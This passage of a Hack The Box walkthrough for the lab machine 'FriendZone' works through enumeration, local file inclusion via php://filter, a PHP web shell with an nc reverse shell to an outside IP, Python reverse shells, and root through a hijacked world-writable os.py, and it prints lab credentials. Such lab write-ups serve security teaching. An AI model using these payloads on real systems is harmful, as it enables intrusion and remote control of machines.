+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.3.3 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://friendzone.red/
+Total requests: 4996
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000689:  C=400     12 L       53 W          423 Ch        &quot;gc._msdcs&quot;
+001321:  C=200     13 L       35 W          391 Ch        &quot;uploads&quot;
+
+</code></pre>
+
+<pre><code>000053:  C=200      0 L        2 W            7 Ch        &quot;login&quot;
+002721:  C=200      0 L       12 W          101 Ch        &quot;dashboard&quot;
+021086:  C=200      0 L        5 W           36 Ch        &quot;timestamp&quot;
+</code></pre>
+
+<p>go to etc/hosts and add in uploads.friendzone.red</p>
+
+<p>WFUZZ</p>
+
+<p>fuzzing dashboard i cound the load function or whatever command api.</p>
+
+<pre><code>wfuzz -c -w /home/htb/wordlist/seclist/Discovery/Web-Content/burp-parameter-names.txt --hl 0 'https://administrator1.friendzone.red/dashboard.php?FUZZ=junk'
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.3.3 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://administrator1.friendzone.red/dashboard.php?FUZZ=junk
+Total requests: 2588
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload
+==================================================================
+
+000233:  C=200      0 L       12 W          101 Ch        &quot;load&quot;^C
+
+</code></pre>
+
+<p>DNS</p>
+
+<pre><code>dig axfr @10.10.10.123 
+
+; &lt;&lt;&gt;&gt; DiG 9.11.5-P1-1-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.123
+; (1 server found)
+;; global options: +cmd
+;; Query time: 39 msec
+;; SERVER: 10.10.10.123#53(10.10.10.123)
+;; WHEN: Tue Feb 12 17:45:45 EST 2019
+;; MSG SIZE  rcvd: 56
+
+</code></pre>
+
+<pre><code>dig axfr @10.10.10.123 friendzone.red 
+
+; &lt;&lt;&gt;&gt; DiG 9.11.5-P1-1-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.123 friendzone.red
+; (1 server found)
+;; global options: +cmd
+friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+friendzone.red.         604800  IN      AAAA    ::1
+friendzone.red.         604800  IN      NS      localhost.
+friendzone.red.         604800  IN      A       127.0.0.1
+administrator1.friendzone.red. 604800 IN A      127.0.0.1
+hr.friendzone.red.      604800  IN      A       127.0.0.1
+uploads.friendzone.red. 604800  IN      A       127.0.0.1
+friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+;; Query time: 43 msec
+;; SERVER: 10.10.10.123#53(10.10.10.123)
+;; WHEN: Tue Feb 12 17:46:46 EST 2019
+;; XFR size: 8 records (messages 1, bytes 289)
+
+</code></pre>
+
+<p>/dashboard.php?image_id=php://filter/convert.base64-encode/resource=/etc/passwd&amp;pagename=expect://ls</p>
+
+<p>wfuzzing possible directories server-status was forbidden ooo</p>
+
+<p>LFI fuzzing</p>
+
+<pre><code>dashboard.php?image_id=.%00&amp;pagename=php://filter/convert.base64-encode/resource=timestamp HTTP/1.1
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/friendzone/LFI-SUCESS.PNG" alt="LFI-SUCESS" /></p>
+
+<pre><code>
+&lt;?php
+
+
+$time_final = time() + 3600;
+
+echo &quot;Final Access timestamp is $time_final&quot;;
+
+
+?&gt;
+</code></pre>
+
+<p>DASHBOARD</p>
+
+<pre><code>&lt;?php
+
+//echo &quot;&lt;center&gt;&lt;h2&gt;Smart photo script for friendzone corp !&lt;/h2&gt;&lt;/center&gt;&quot;;
+//echo &quot;&lt;center&gt;&lt;h3&gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3&gt;&lt;/center&gt;&quot;;
+echo &quot;&lt;title&gt;FriendZone Admin !&lt;/title&gt;&quot;;
+$auth = $_COOKIE[&quot;FriendZoneAuth&quot;];
+
+if ($auth === &quot;e7749d0f4b4da5d03e6e9196fd1d18f1&quot;){
+ echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
+
+echo &quot;&lt;center&gt;&lt;h2&gt;Smart photo script for friendzone corp !&lt;/h2&gt;&lt;/center&gt;&quot;;
+echo &quot;&lt;center&gt;&lt;h3&gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3&gt;&lt;/center&gt;&quot;;
+
+if(!isset($_GET[&quot;image_id&quot;])){
+  echo &quot;&lt;br&gt;&lt;br&gt;&quot;;
+  echo &quot;&lt;center&gt;&lt;p&gt;image_name param is missed !&lt;/p&gt;&lt;/center&gt;&quot;;
+  echo &quot;&lt;center&gt;&lt;p&gt;please enter it to show the image&lt;/p&gt;&lt;/center&gt;&quot;;
+  echo &quot;&lt;center&gt;&lt;p&gt;default is image_id=a.jpg&amp;pagename=timestamp&lt;/p&gt;&lt;/center&gt;&quot;;
+ }else{
+ $image = $_GET[&quot;image_id&quot;];
+ echo &quot;&lt;center&gt;&lt;img src='images/$image'&gt;&lt;/center&gt;&quot;;
+
+ echo &quot;&lt;center&gt;&lt;h1&gt;Something went worng ! , the script include wrong param !&lt;/h1&gt;&lt;/center&gt;&quot;;
+ include($_GET[&quot;pagename&quot;].&quot;.php&quot;);
+ //echo $_GET[&quot;pagename&quot;];
+ }
+}else{
+echo &quot;&lt;center&gt;&lt;p&gt;You can't see the content ! , please login !&lt;/center&gt;&lt;/p&gt;&quot;;
+}
+?&gt;
+</code></pre>
+
+<p>UPLOAD.PHP</p>
+
+<p>THIS WAS TRICKY HAD TO GUESS I MESSED UP AND KEPT ADDING THE DARN EXTENTION</p>
+
+<p>burp</p>
+
+<pre><code>/dashboard.php?image_id=a.jpg&amp;pagename=php://filter/convert.base64-encode/resource=../uploads/upload
+</code></pre>
+
+<p>upload.php</p>
+
+<pre><code>PD9waHAKCi8vIG5vdCBmaW5pc2hlZCB5ZXQgLS0gZnJpZW5kem9uZSBhZG1pbiAhCgppZihpc3NldCgkX1BPU1RbImltYWdlIl0pKXsKCmVjaG8gIlVwbG9hZGVkIHN1Y2Nlc3NmdWxseSAhPGJyPiI7CmVjaG8gdGltZSgpKzM2MDA7Cn1lbHNlewoKZWNobyAiV0hBVCBBUkUgWU9VIFRSWUlORyBUTyBETyBIT09PT09PTUFOICEiOwoKfQoKPz4K
+</code></pre>
+
+<pre><code>&lt;?php
+// not finished yet -- friendzone admin !
+if(isset($_POST[&quot;image&quot;])){
+echo &quot;Uploaded successfully !&lt;br&gt;&quot;;
+echo time()+3600;
+}else{
+echo &quot;WHAT ARE YOU TRYING TO DO HOOOOOOMAN !&quot;;
+}
+?&gt;
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/friendzone/admin.webpage4.PNG" alt="admin.webpage4" /></p>
+
+<p>USER</p>
+
+<p>taking all the bits and pieces here to get user. Remember the nmap scan that it showed the paths for the smb shares. This will help find the uploaded php shell. the use the lfi to run the script. It will smash the shell the script here is to keep it simple.</p>
+
+<p>SHELL ===</p>
+
+<pre><code>&lt;?php echo exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.14 9080 &gt;/tmp/f') ?&gt;
+</code></pre>
+
+<p>SMBCLIENT</p>
+
+<pre><code>smbclient -U info //10.10.10.123/Development
+</code></pre>
+
+<p>LFI</p>
+
+<pre><code>/dashboard.php?image_id=a.jpg&amp;pagename=php://filter/convert.base64-encode/resource=../../../../../etc/Development/pinkie2
+</code></pre>
+
+<p>LFI/RCE</p>
+
+<pre><code>/dashboard.php?image_id=a.jpg&amp;pagename=php://filter/resource=../../../../../etc/Development/pinkie2
+</code></pre>
+
+<p>PYTHON TTY</p>
+
+<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/friendzone/admin.webpage5.PNG" alt="admin.webpage5" /></p>
+
+<p>LinEnum</p>
+
+<pre><code>
+</code></pre>
+
+<p>REPORTER.PY</p>
+
+<pre><code>#!/usr/bin/python
+
+import os
+variables possibly usernames for shares
+to_address = &quot;admin1@friendzone.com&quot;
+from_address = &quot;admin2@friendzone.com&quot;
+
+print &quot;[+] Trying to send email to %s&quot;%to_address
+#####Command is commented out is a variable
+#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass &quot;PAPAP&quot;'''
+python to run command line
+#os.system(command)
+
+# I need to edit the script later
+# Sam ~ python developer
+Sam username or the creator name.
+</code></pre>
+
+<p>Hmmmm, in the beginning it said contact us. the above python code is useless. it does provide email address and a password PAPAP</p>
+
+<p>SUID BINARIES</p>
+
+<pre><code>/bin/fusermount                                                                           
+/bin/umount                                                                               
+/bin/mount                                                                                
+/bin/su                                                                                   
+/bin/ntfs-3g                                            
+/bin/ping      
+/usr/bin/passwd
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/sbin/exim4
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+</code></pre>
+
+<p>WORLD WRITEABLE</p>
+
+<pre><code>find /usr/*/python2.7 -perm -o+w
+</code></pre>
+
+<pre><code>/usr/lib/python2.7
+/usr/lib/python2.7/sitecustomize.py
+/usr/lib/python2.7/config-x86_64-linux-gnu/libpython2.7.so
+/usr/lib/python2.7/os.py
+/usr/lib/python2.7/dist-packages/lsb_release.py
+</code></pre>
+
+<p>uploaded a python reverse shell from this link first. cd into python2.7 rm os.py upload a python script with a reverse shell named os.py</p>
+
+<pre><code>Agpyu12!0.213$
+</code></pre>
+
+<p><img src="ssh-creds.PNG" alt="ssh-creds" /></p>
+
+<pre><code>import pty
+import socket
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((&quot;127.0.0.1&quot;, 5038))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+os.putenv(&quot;HISTFILE&quot;,'/dev/null')
+pty.spawn(&quot;/bin/bash&quot;)
+
+</code></pre>
+
+<p>no pty</p>
+
+<pre><code>import pty
+import socket
+import subprocess
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((&quot;127.0.0.1&quot;, 5038))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])
+</code></pre>
+
+<p>Okay So i was going in the wrong directions. i sat back and thought so go to /usr/lib/python2.7 edit os.py at the bottom.</p>
+
+<pre><code>17system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 5038 &gt;/tmp/f')
+</code></pre>
+
+<p><img src="root.PNG" alt="root" /></p>
+
+<p><img src="root2.PNG" alt="root2" /></p>
+
+<p>#</p>
+
+<p><img src="../../../../../../Users/charl/OneDrive/Pictures/MeMe/images.jpg" alt="images" /></p>
+
+
+    
+    
+        <div class="chevrons">
+    <div id="navigation">
+<a class="nav nav-prev" href="/hackthebox/boxes/flujab/" title="Flujab"> <i class="fa fa-chevron-left"></i><label>Flujab</label></a>
+    <a class="nav nav-next" href="/hackthebox/boxes/grand-pa/" title="GrandMa" style="margin-right: 0px;"><label>GrandMa</label><i class="fa fa-chevron-right"></i></a></div>
+  </div>
+
+  </section>
+</article>
+
+<footer>
+
+<div class="footline">
+    
+
+    
+
+    
+
+    
+    <div class="github-link">
+      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/friendzone.md" target="blank"><i class="fa fa-code-fork"></i>
+        Improve this page</a>
+    </div>
+    
+  </div>
+
+
+	<div>
+
+
+  
+    Create a content/_footer.md file to customize the footer content
+  
+
+
+
+	</div>
+</footer>
+
+<script src="/js/clipboard.min.js"></script>
+
+<link href="/css/featherlight.min.css" rel="stylesheet">
+<script src="/js/featherlight.min.js"></script>
+
+
+
+<script src="/theme-flex/script.js"></script>
+
+
+    
+
+    
+    
+
+    
+  </body>
+</html>
